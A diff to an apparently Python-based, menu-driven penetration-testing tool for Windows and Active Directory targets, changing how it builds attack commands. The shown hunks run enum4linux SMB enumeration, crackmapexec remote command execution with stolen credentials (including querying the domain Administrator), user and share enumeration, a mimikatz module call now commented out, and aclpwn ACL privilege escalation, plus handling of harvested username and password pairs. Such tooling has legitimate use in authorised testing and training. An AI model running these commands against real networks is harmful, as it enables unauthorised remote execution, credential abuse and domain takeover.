@@ -1086,11 +1086,8 @@ while True:
 
    if selection == '30':
       if TIP[:5] != "EMPTY":
-         print("\n[*] Trying with a null session first...")
+         print ("")
          command("enum4linux -v " + TIP.rstrip(" "))
-
-         print("\n[*] Now trying with user " + USR.rstrip(" ") + " and password " + PAS.rstrip(" ") + "...")
-         command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" "))
       prompt()
 
 #------------------------------------------------------------------------------------- 
@@ -1834,7 +1831,9 @@ while True:
 
             print("[+] Found User", get1)
             USER[x] = get1[:COL3]
-            PASS[x] = get4[:COL4]
+            USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")			# STRIP DOMAIN NAME
+            PASS[x] = get4[:COL4]         
+            
             if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
             if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
 
@@ -1868,11 +1867,13 @@ while True:
 
          command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
+
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
+         
+#         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
       
          HASH = "." # Reset Value
          for x in range (0, MAXX):
@@ -2103,7 +2104,7 @@ while True:
          BH1 = input("\n[+] Enter Neo4j username: ")
          BH2 = input("[+] Enter Neo4j password: ")
          if BH1 != "" and BH2 != "":
-            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
+            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
          else:
             print("\n[-] Username or password cannot be null...")
       prompt()
